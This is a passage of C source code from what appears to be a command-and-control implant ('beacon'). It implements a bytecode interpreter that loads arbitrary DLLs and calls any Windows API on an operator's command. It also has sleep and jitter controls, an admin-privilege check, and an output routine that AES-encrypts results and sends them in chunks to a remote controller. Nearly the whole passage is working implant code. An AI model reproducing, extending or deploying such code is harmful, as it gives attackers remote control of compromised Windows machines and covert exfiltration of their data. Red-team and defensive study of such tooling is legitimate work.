        { "BeaconOutput",  ( FARPROC ) BeaconOutput  },
        { "BeaconIsAdmin", ( FARPROC ) BeaconIsAdmin },
        { NULL, NULL }
    };
    for ( int i = 0; tbl[i].n; i++ ) {
        const char * a = tbl[i].n;
        const char * b = name;
        while ( *a && *b && *a == *b ) { a++; b++; }
        if ( !*a && !*b ) return tbl[i].f;
    }
    return NULL;
}

void execute_railgun( char * data, int len )
{
    if ( len < 6 ) {
        BeaconPrintf( CALLBACK_ERROR, "railgun: payload too short" );
        return;
    }

    const char * p   = data;
    const char * end = data + len;

    /* ---- parse header ---- */

    unsigned char num_dlls = rgs_u8( &p, end );
    if ( num_dlls > RGS_DLLS_MAX ) {
        BeaconPrintf( CALLBACK_ERROR, "railgun: too many DLLs" );
        return;
    }

    char *   dll_names   [ RGS_DLLS_MAX ];
    HMODULE  dll_handles [ RGS_DLLS_MAX ];

    for ( int i = 0; i < num_dlls; i++ )
    {
        unsigned char name_len = rgs_u8( &p, end );
        dll_names[i]   = ( char * ) p;   /* points into data â€” already null-terminated */
        dll_handles[i] = NULL;
        p += name_len;
    }

    unsigned char num_vars = rgs_u8( &p, end );
    if ( num_vars > RGS_VARS_MAX ) {
        BeaconPrintf( CALLBACK_ERROR, "railgun: too many variables" );
        return;
    }

    unsigned short code_len = rgs_u16le( &p, end );
    const char * code_start = p;
    const char * code_end   = p + code_len;

    /* args section: everything after the bytecode (may be empty) */
    datap args_parser;
    BeaconDataParse( &args_parser, ( char * ) code_end, ( int )( end - code_end ) );

    /* ---- interpreter state ---- */

    ULONG_PTR vars     [ RGS_VARS_MAX  ];
    ULONG_PTR stk      [ RGS_STACK_MAX ];
    char      stk_type [ RGS_STACK_MAX ];
    int       sp = 0;

    for ( int i = 0; i < num_vars;  i++ ) vars[i]     = 0;
    for ( int i = 0; i < RGS_STACK_MAX; i++ ) stk_type[i] = RGS_TAG_VAL;

#if defined WIN_X64
    typedef ULONG_PTR (* rgs_fn )(
        ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
        ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
        ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
#endif

#define RGS_PUSH(val, tag)                                        \
    do {                                                          \
        if ( sp >= RGS_STACK_MAX ) {                              \
            BeaconPrintf( CALLBACK_ERROR, "railgun: stack overflow" ); \
            goto rgs_cleanup;                                     \
        }                                                         \
        stk[sp]      = (ULONG_PTR)(val);                         \
        stk_type[sp] = (tag);                                     \
        sp++;                                                     \
    } while (0)

#define RGS_POP(dst, tag_dst)  \
    do {                       \
        if ( sp <= 0 ) {       \
            BeaconPrintf( CALLBACK_ERROR, "railgun: stack underflow" ); \
            goto rgs_cleanup;  \
        }                      \
        sp--;                  \
        (dst)     = stk[sp];   \
        (tag_dst) = stk_type[sp]; \
    } while (0)

/* Variant that discards the type tag â€” use when only the value is needed. */
#define RGS_POP_VAL(dst)       \
    do {                       \
        if ( sp <= 0 ) {       \
            BeaconPrintf( CALLBACK_ERROR, "railgun: stack underflow" ); \
            goto rgs_cleanup;  \
        }                      \
        sp--;                  \
        (dst) = stk[sp];       \
    } while (0)

    const char * pc = code_start;

    while ( pc < code_end )
    {
        unsigned char op = rgs_u8( &pc, code_end );

        switch ( op )
        {
        case RGS_OP_HALT:
            goto rgs_done;

        case RGS_OP_PUSH_INT:
        {
            ULONG_PTR v = ( ULONG_PTR ) rgs_u64le( &pc, code_end );
            RGS_PUSH( v, RGS_TAG_VAL );
            break;
        }

        case RGS_OP_PUSH_STR:
        {
            unsigned short slen = rgs_u16le( &pc, code_end );
            char * buf = ( char * ) MSVCRT$malloc( slen + 1 );
            if ( !buf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            for ( unsigned short i = 0; i < slen; i++ ) buf[i] = rgs_u8( &pc, code_end );
            buf[slen] = '\0';
            RGS_PUSH( buf, RGS_TAG_STR );
            break;
        }

        case RGS_OP_PUSH_WSTR:
        {
            unsigned short blen = rgs_u16le( &pc, code_end );
            /* blen is byte count of UTF-16LE; allocate +2 for null terminator */
            char * buf = ( char * ) MSVCRT$malloc( blen + 2 );
            if ( !buf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            for ( unsigned short i = 0; i < blen; i++ ) buf[i] = rgs_u8( &pc, code_end );
            buf[blen] = buf[blen + 1] = '\0';
            RGS_PUSH( buf, RGS_TAG_STR );
            break;
        }

        case RGS_OP_PUSH_OUT:
        {
            unsigned short sz = rgs_u16le( &pc, code_end );
            char * buf = ( char * ) MSVCRT$malloc( sz );
            if ( !buf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            memset( buf, 0, sz );
            RGS_PUSH( buf, RGS_TAG_OUT );

            sp--;  /* remove the pointer we just pushed */
            if ( sp + 2 > RGS_STACK_MAX ) {
                MSVCRT$free( buf );
                BeaconPrintf( CALLBACK_ERROR, "railgun: stack overflow" );
                goto rgs_cleanup;
            }
            stk[sp]      = ( ULONG_PTR ) sz;
            stk_type[sp] = 'O';   /* hidden size tag */
            sp++;
            stk[sp]      = ( ULONG_PTR ) buf;
            stk_type[sp] = RGS_TAG_OUT;
            sp++;
            break;
        }

        case RGS_OP_LOAD:
        {
            unsigned char idx = rgs_u8( &pc, code_end );
            if ( idx >= num_vars ) { BeaconPrintf( CALLBACK_ERROR, "railgun: bad var" ); goto rgs_cleanup; }
            RGS_PUSH( vars[idx], RGS_TAG_VAL );
            break;
        }

        case RGS_OP_STORE:
        {
            unsigned char idx = rgs_u8( &pc, code_end );
            if ( idx >= num_vars ) { BeaconPrintf( CALLBACK_ERROR, "railgun: bad var" ); goto rgs_cleanup; }
            ULONG_PTR v;
            RGS_POP_VAL( v );
            vars[idx] = v;
            break;
        }

        case RGS_OP_LOAD_ADDR:
        {
            unsigned char idx = rgs_u8( &pc, code_end );
            if ( idx >= num_vars ) { BeaconPrintf( CALLBACK_ERROR, "railgun: bad var" ); goto rgs_cleanup; }
            RGS_PUSH( &vars[idx], RGS_TAG_VAL );
            break;
        }

        case RGS_OP_DEREF:
        {
            unsigned char idx = rgs_u8( &pc, code_end );
            if ( idx >= num_vars ) { BeaconPrintf( CALLBACK_ERROR, "railgun: bad var" ); goto rgs_cleanup; }
            RGS_PUSH( *(ULONG_PTR *)vars[idx], RGS_TAG_VAL );
            break;
        }

        case RGS_OP_OR:
        {
            ULONG_PTR b; RGS_POP_VAL( b );
            ULONG_PTR a; RGS_POP_VAL( a );
            RGS_PUSH( a | b, RGS_TAG_VAL );
            break;
        }

        case RGS_OP_CALL:
        {
            unsigned char dll_idx  = rgs_u8( &pc, code_end );
            unsigned char func_len = rgs_u8( &pc, code_end );
            char func_name[ 256 ];
            for ( int i = 0; i < func_len; i++ ) func_name[i] = rgs_u8( &pc, code_end );
            func_name[ func_len ] = '\0';

            unsigned char nargs    = rgs_u8( &pc, code_end );
            char arg_type[ RAILGUN_MAX_ARGS ];
            for ( int i = 0; i < nargs; i++ ) arg_type[i] = ( char ) rgs_u8( &pc, code_end );

            /* Collect arg values and sizes from the stack.
             * Stack order: arg[0] pushed first (deepest), arg[nargs-1] on top. */
            ULONG_PTR arg_vals [ RAILGUN_MAX_ARGS ];
            int       arg_sizes[ RAILGUN_MAX_ARGS ];  /* only used for 'o' args */

            for ( int i = 0; i < RAILGUN_MAX_ARGS; i++ ) { arg_vals[i] = 0; arg_sizes[i] = 0; }

            /* Pop right-to-left so arg[0] ends up in arg_vals[0] */
            for ( int i = nargs - 1; i >= 0; i-- )
            {
                ULONG_PTR v;
                RGS_POP_VAL( v );
                arg_vals[i] = v;

                if ( arg_type[i] == 'o' )
                {
                    /* size slot is immediately below (tag 'O') */
                    ULONG_PTR sz;
                    RGS_POP_VAL( sz );
                    arg_sizes[i] = ( int ) sz;
                }
            }

            /* Resolve function pointer â€” "beacon" is a pseudo-DLL backed by
             * an internal lookup table; all other names go through the loader. */
            FARPROC fn        = NULL;
            BOOL    is_beacon = FALSE;

            if ( dll_idx == 0xFF )
            {
                /* Search imported DLLs in declaration order. */
                for ( int d = 0; d < num_dlls && !fn; d++ )
                {
                    if ( rgs_is_beacon_dll( dll_names[d] ) )
                    {
                        fn = rgs_lookup_beacon_fn( func_name );
                        if ( fn ) is_beacon = TRUE;
                    }
                    else
                    {
                        if ( !dll_handles[d] ) {
                            HMODULE h = KERNEL32$GetModuleHandleA( dll_names[d] );
                            if ( !h ) h = LoadLibraryA( dll_names[d] );
                            dll_handles[d] = h;
                        }
                        if ( dll_handles[d] )
                            fn = GetProcAddress( dll_handles[d], func_name );
                    }
                }
            }
            else if ( dll_idx < num_dlls )
            {
                if ( rgs_is_beacon_dll( dll_names[ dll_idx ] ) )
                {
                    fn = rgs_lookup_beacon_fn( func_name );
                    if ( fn ) is_beacon = TRUE;
                }
                else
                {
                    if ( !dll_handles[ dll_idx ] ) {
                        HMODULE h = KERNEL32$GetModuleHandleA( dll_names[ dll_idx ] );
                        if ( !h ) h = LoadLibraryA( dll_names[ dll_idx ] );
                        dll_handles[ dll_idx ] = h;
                    }
                    if ( dll_handles[ dll_idx ] )
                        fn = GetProcAddress( dll_handles[ dll_idx ], func_name );
                }
            }

            if ( !fn ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: %s not found", func_name );
                for ( int i = 0; i < nargs; i++ )
                    if ( arg_type[i] == 's' || arg_type[i] == 'o' )
                        MSVCRT$free( ( void * ) arg_vals[i] );
                goto rgs_cleanup;
            }

#if defined WIN_X64
            ULONG_PTR retval = (( rgs_fn ) fn)(
                arg_vals[0],  arg_vals[1],  arg_vals[2],  arg_vals[3],
                arg_vals[4],  arg_vals[5],  arg_vals[6],  arg_vals[7],
                arg_vals[8],  arg_vals[9],  arg_vals[10], arg_vals[11] );
#else
            ULONG_PTR retval = rgs_call_x86( fn, arg_vals, nargs );
#endif

            /* Output: "func => 0x... (...)"
             * Suppressed for beacon pseudo-DLL calls â€” those functions handle
             * their own output (BeaconPrintf, BeaconOutput, etc.). */
            if ( !is_beacon )
            {
                int out_sz = func_len + 64;
                for ( int i = 0; i < nargs; i++ )
                    if ( arg_type[i] == 'o' ) out_sz += 16 + arg_sizes[i] * 2 + 2;

                formatp out;
                BeaconFormatAlloc( &out, out_sz );
                BeaconFormatPrintf( &out, "%s => 0x%I64x (%I64u)\n",
                    func_name,
                    ( unsigned __int64 ) retval,
                    ( unsigned __int64 ) retval );

                for ( int i = 0; i < nargs; i++ )
                {
                    if ( arg_type[i] != 'o' ) continue;
                    BeaconFormatPrintf( &out, "  out[%d] = ", i );
                    char * ob = ( char * ) arg_vals[i];
                    for ( int j = 0; j < arg_sizes[i]; j++ ) {
                        unsigned char b = ( unsigned char ) ob[j];
                        char pair[2];
                        pair[0] = "0123456789abcdef"[ b >> 4 ];
                        pair[1] = "0123456789abcdef"[ b & 0xf ];
                        BeaconFormatAppend( &out, pair, 2 );
                    }
                    BeaconFormatAppend( &out, "\n", 1 );
                }

                int olen; char * ostr = BeaconFormatToString( &out, &olen );
                BeaconOutput( CALLBACK_OUTPUT, ostr, olen );
                BeaconFormatFree( &out );
            }

            /* Free heap args */
            for ( int i = 0; i < nargs; i++ )
                if ( arg_type[i] == 's' || arg_type[i] == 'o' )
                    MSVCRT$free( ( void * ) arg_vals[i] );

            RGS_PUSH( retval, RGS_TAG_VAL );
            break;
        }

        case RGS_OP_POP:
        {
            ULONG_PTR v; char tag;
            RGS_POP( v, tag );
            if ( tag == RGS_TAG_STR || tag == RGS_TAG_OUT )
                MSVCRT$free( ( void * ) v );
            break;
        }

        case RGS_OP_JMP:
        {
            short off = ( short ) rgs_u16le( &pc, code_end );
            pc += off;
            break;
        }

        case RGS_OP_JZ:
        {
            short off = ( short ) rgs_u16le( &pc, code_end );
            ULONG_PTR v;
            RGS_POP_VAL( v );
            if ( v == 0 ) pc += off;
            break;
        }

        case RGS_OP_JNZ:
        {
            short off = ( short ) rgs_u16le( &pc, code_end );
            ULONG_PTR v;
            RGS_POP_VAL( v );
            if ( v != 0 ) pc += off;
            break;
        }

        case RGS_OP_CMP_EQ:  case RGS_OP_CMP_NEQ:
        case RGS_OP_CMP_LT:  case RGS_OP_CMP_GT:
        case RGS_OP_CMP_LE:  case RGS_OP_CMP_GE:
        {
            ULONG_PTR b; RGS_POP_VAL( b );
            ULONG_PTR a; RGS_POP_VAL( a );
            ULONG_PTR result;
            switch ( op ) {
            case RGS_OP_CMP_EQ:  result = a == b ? 1 : 0; break;
            case RGS_OP_CMP_NEQ: result = a != b ? 1 : 0; break;
            case RGS_OP_CMP_LT:  result = a <  b ? 1 : 0; break;
            case RGS_OP_CMP_GT:  result = a >  b ? 1 : 0; break;
            case RGS_OP_CMP_LE:  result = a <= b ? 1 : 0; break;
            case RGS_OP_CMP_GE:  result = a >= b ? 1 : 0; break;
            default:             result = 0;
            }
            RGS_PUSH( result, RGS_TAG_VAL );
            break;
        }

        case RGS_OP_ARG_INT:
        {
            if ( args_parser.length < 4 ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_int: no more args" );
                goto rgs_cleanup;
            }
            ULONG_PTR v = ( ULONG_PTR )( ULONG ) BeaconDataInt( &args_parser );
            RGS_PUSH( v, RGS_TAG_VAL );
            break;
        }

        case RGS_OP_ARG_STR:
        {
            if ( args_parser.length < 4 ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_str: no more args" );
                goto rgs_cleanup;
            }
            int slen = BeaconDataInt( &args_parser );
            if ( slen < 0 || slen > args_parser.length ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_str: truncated" );
                goto rgs_cleanup;
            }
            char * ssrc = args_parser.buffer;
            args_parser.buffer += slen;
            args_parser.length -= slen;
            char * sbuf = ( char * ) MSVCRT$malloc( slen );
            if ( !sbuf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            for ( int i = 0; i < slen; i++ ) sbuf[i] = ssrc[i];
            RGS_PUSH( sbuf, RGS_TAG_STR );
            break;
        }

        case RGS_OP_ARG_WSTR:
        {
            if ( args_parser.length < 4 ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_wstr: no more args" );
                goto rgs_cleanup;
            }
            int wlen = BeaconDataInt( &args_parser );
            if ( wlen < 0 || wlen > args_parser.length ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_wstr: truncated" );
                goto rgs_cleanup;
            }
            char * wsrc = args_parser.buffer;
            args_parser.buffer += wlen;
            args_parser.length -= wlen;
            char * wbuf = ( char * ) MSVCRT$malloc( wlen );
            if ( !wbuf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            for ( int i = 0; i < wlen; i++ ) wbuf[i] = wsrc[i];
            RGS_PUSH( wbuf, RGS_TAG_STR );
            break;
        }

        case RGS_OP_ARG_BYTES:
        {
            if ( args_parser.length < 4 ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_bytes: no more args" );
                goto rgs_cleanup;
            }
            int blen = BeaconDataInt( &args_parser );
            if ( blen < 0 || blen > args_parser.length ) {
                BeaconPrintf( CALLBACK_ERROR, "railgun: arg_bytes: truncated" );
                goto rgs_cleanup;
            }
            char * bsrc = args_parser.buffer;
            args_parser.buffer += blen;
            args_parser.length -= blen;
            char * bbuf = ( char * ) MSVCRT$malloc( blen );
            if ( !bbuf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
            for ( int i = 0; i < blen; i++ ) bbuf[i] = bsrc[i];
            RGS_PUSH( bbuf, RGS_TAG_STR );
            break;
        }

        default:
            BeaconPrintf( CALLBACK_ERROR, "railgun: unknown opcode 0x%02x at offset %d",
                op, ( int )( pc - code_start - 1 ) );
            goto rgs_cleanup;
        }
    }

rgs_done:
rgs_cleanup:
    /* Free any heap values still on the stack (e.g., after early abort) */
    for ( int i = 0; i < sp; i++ )
        if ( stk_type[i] == RGS_TAG_STR || stk_type[i] == RGS_TAG_OUT )
            MSVCRT$free( ( void * ) stk[i] );

#undef RGS_PUSH
#undef RGS_POP
}

LPVOID allocate_memory( size_t size, DWORD protection )
{
    return KERNEL32$VirtualAlloc( NULL, size, MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, protection );
}

void free_memory ( LPVOID address )
{
    KERNEL32$VirtualFree ( address, 0, MEM_RELEASE );
}

void set_sleep( char * data, int len )
{
    datap parser;
    BeaconDataParse( &parser, data, len );

    int sleep  = BeaconDataInt( &parser );
    int jitter = BeaconDataInt( &parser );

    if ( sleep < 1 ) {
        sleep = 1;
    }

    if ( jitter > 100 ) {
        jitter = 100;
    }
    
    g_config.sleep  = sleep;
    g_config.jitter = jitter;

    BeaconOutput( CALLBACK_OUTPUT, "", 0 );
}

void exit_beacon( )
{
    g_running = FALSE;
    BeaconOutput( CALLBACK_OUTPUT, "", 0 );
}

/**
 * Data Parser APIs
 */

void BeaconDataParse( datap * parser, char * buffer, int size )
{
    parser->buffer   = buffer;
    parser->original = buffer;
    parser->length   = size;
    parser->size     = size;
}

char * BeaconDataExtract( datap * parser, int * size )
{
    int sz = BeaconDataInt( parser );
    char * buffer = parser->buffer;

    parser->buffer += sz;
    parser->length -= sz;

    if ( size ) {
        * size = sz;
    }

    return buffer;
}

char * BeaconDataPtr( datap * parser, int size )
{
    if ( parser->length < size ) {
        return NULL;
    }
    
    char * data = parser->buffer;

    parser->buffer += size;
    parser->length -= size;

    return data;
}

short BeaconDataShort( datap * parser )
{
    short value = * ( short * ) parser->buffer;

    parser->buffer += sizeof ( short );
    parser->length -= sizeof ( short );

    return WS2_32$ntohs( value );
}

int BeaconDataInt( datap * parser )
{
    int value = * ( int * ) parser->buffer;

    parser->buffer += sizeof ( int );
    parser->length -= sizeof ( int );

    return WS2_32$ntohl( value );
}

int BeaconDataLength( datap * parser )
{
    return parser->length;
}

/**
 * Format APIs
 */

void BeaconFormatAlloc( formatp * parser, int maxsz )
{
    parser->original = MSVCRT$malloc( maxsz );
    parser->buffer   = parser->original;
    parser->length   = maxsz;
    parser->size     = maxsz;
}

void BeaconFormatAppend( formatp * parser, char * data, int len )
{
    memcpy( parser->buffer, data, len );

    parser->buffer += len;
    parser->length -= len;
}

void BeaconFormatInt( formatp * parser, int val )
{
    val = WS2_32$htonl( val );
    BeaconFormatAppend( parser, ( char * ) &val, sizeof( int ) );
}

void BeaconFormatPrintf( formatp * parser, char * fmt, ... )
{
    va_list args;
    va_start( args, fmt );
    int len = MSVCRT$vsnprintf( NULL, 0, fmt, args );
    va_end( args );
 
    if ( len < 0 ) {
        return;
    }
 
    char * temp = MSVCRT$malloc( len + 1 );
 
    if ( temp == NULL ) {
        return;
    }
 
    va_start( args, fmt );
    MSVCRT$vsnprintf( temp, len + 1, fmt, args );
    va_end( args );
 
    BeaconFormatAppend( parser, temp, len );
 
    MSVCRT$free( temp );
}

char * BeaconFormatToString( formatp * parser, int * size )
{
    if ( size ) {
        * size = parser->size - parser->length;
    }

    return parser->original;
}

void BeaconFormatReset( formatp * parser )
{
    parser->buffer = parser->original;
    parser->length = parser->size;
}

void BeaconFormatFree( formatp * parser )
{
    MSVCRT$free( parser->original );
}

/**
 * Output API
 */

void BeaconPrintf( int type, char * fmt, ... )
{
    va_list args;
    va_start( args, fmt );
    int len = MSVCRT$vsnprintf( NULL, 0, fmt, args );
    va_end ( args );
 
    if ( len < 0 ) {
        return;
    }
 
    char * temp = MSVCRT$malloc( len + 1 );
 
    if ( temp == NULL ) {
        return;
    }
 
    va_start( args, fmt );
    MSVCRT$vsnprintf( temp, len + 1, fmt, args );
    va_end( args );
 
    BeaconOutput( type, temp, len );
 
    MSVCRT$free( temp );
}

void BeaconOutput( int type, char * data, int data_len )
{
    #define BEACON_CHUNK_SIZE 1024

    /* BCryptEncrypt rejects NULL input â€” use a dummy byte for empty payloads */
    char empty = 0;

    if ( ! data || data_len < 0 )
    {
        data     = &empty;
        data_len = 0;
    }

    int offset = 0;

    do
    {
        int chunk_len = data_len - offset;

        if ( chunk_len > BEACON_CHUNK_SIZE ) {
            chunk_len = BEACON_CHUNK_SIZE;
        }

        char * chunk    = data + offset;
        int    complete = ( offset + chunk_len >= data_len ) ? 1 : 0;

        /* generate random IV and encrypt the chunk */
        UCHAR iv[ AES_KEY_LEN ];
        random_bytes( iv, AES_KEY_LEN );

        ULONG ct_len = ( ULONG ) chunk_len + AES_KEY_LEN;
        UCHAR * ct   = MSVCRT$malloc( ct_len );

        if ( !ct ) {
            return;
        }

        if ( !aes_encrypt( ( UCHAR * ) chunk, ( ULONG ) chunk_len, ( UCHAR * ) g_metadata.aes_key, iv, ct, &ct_len ))
        {
            MSVCRT$free( ct );
            return;
        }

        /* HMAC over IV || ciphertext */
        ULONG mac_input_len = AES_KEY_LEN + ct_len;
        UCHAR * mac_input   = MSVCRT$malloc( mac_input_len );

        if ( !mac_input )
        {
            MSVCRT$free( ct );
            return;
        }

        memcpy( mac_input, iv, AES_KEY_LEN );
        memcpy( mac_input + AES_KEY_LEN, ct, ct_len );

        UCHAR hmac[ HMAC_LEN ];

        if ( !compute_hmac( mac_input, mac_input_len, ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN, hmac ))
        {
            MSVCRT$free( mac_input );
            MSVCRT$free( ct );
            return;
        }

        MSVCRT$free( mac_input );

        /* enc_data = hmac | iv | ciphertext */
        ULONG enc_data_len = HMAC_LEN + AES_KEY_LEN + ct_len;

        /* wire format: type | task_id | enc_data_len | enc_data | complete */
        size_t total_len = sizeof( int  )   /* type         */
                         + sizeof( UINT )   /* task_id      */
                         + sizeof( int  )   /* enc_data_len */
                         + enc_data_len     /* enc_data     */
                         + sizeof( int  );  /* complete     */

        formatp output;
        BeaconFormatAlloc  ( &output, total_len );
        BeaconFormatInt    ( &output, type );
        BeaconFormatInt    ( &output, g_current_task_id );
        BeaconFormatInt    ( &output, enc_data_len );
        BeaconFormatAppend ( &output, ( char * ) hmac, HMAC_LEN );
        BeaconFormatAppend ( &output, ( char * ) iv, AES_KEY_LEN );
        BeaconFormatAppend ( &output, ( char * ) ct, ct_len );
        BeaconFormatInt    ( &output, complete );

        MSVCRT$free( ct );

        udc2_go( output.original, output.size, NULL, NULL );

        BeaconFormatFree( &output );

        offset += chunk_len;

    } while ( offset < data_len );

#undef BEACON_CHUNK_SIZE
}

/**
 * Internal APIs
 */

BOOL BeaconIsAdmin( )
{
    SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;
    PSID sid;

    if ( !ADVAPI32$AllocateAndInitializeSid( &nt_auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid )) {
        return FALSE;
    }

    BOOL is_admin = FALSE;
    ADVAPI32$CheckTokenMembership( NULL, sid, &is_admin );

    ADVAPI32$FreeSid( sid );
    return is_admin;
}